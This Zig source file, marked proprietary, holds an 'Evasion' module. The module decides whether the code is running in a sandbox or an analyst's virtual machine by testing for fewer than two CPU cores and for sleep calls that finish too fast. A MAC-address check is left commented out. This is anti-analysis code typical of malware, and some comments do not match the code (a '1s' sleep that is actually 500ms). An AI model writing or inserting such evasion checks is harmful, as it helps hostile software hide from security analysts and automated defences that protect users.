// Copyright (c) 2025 il1v3y. All Rights Reserved.
// Unauthorized copying or use of this file is strictly prohibited.
// Proprietary and confidential.

const std = @import("std");
const builtin = @import("builtin");
const util = @import("util.zig");

pub const Evasion = struct {
    /// Checks if the environment looks like a sandbox or analyst VM.
    /// Returns true if analysis is detected.
    pub fn isAnalysisEnvironment() bool {
        if (checkCpuCores()) return true;
        if (checkTimeDistortion()) return true;
        // if (checkMacAddress()) return true; // TODO: OUI lookups
        return false;
    }

    /// Sandboxes often have 1 or 2 vCPUs. Real user machines usually have 4+.
    fn checkCpuCores() bool {
        const cores = std.Thread.getCpuCount() catch return false; // If fails, assume safe
        if (cores < 2) return true;
        return false;
    }

    /// Emulators fast-forward sleep calls to skip analysis.
    /// We verify if 'sleep(1s)' actually took 1s.
    fn checkTimeDistortion() bool {
        var timer = std.time.Timer.start() catch return false;
        
        // Sleep for 500ms
        util.sleep(500 * 1_000_000);
        
        const delta = timer.read(); // nanoseconds

        // If we slept less than 450ms (450,000,000ns), time is being accelerated/skipped.
        if (delta < 450 * 1_000_000) return true;
        
        return false;
    }
};
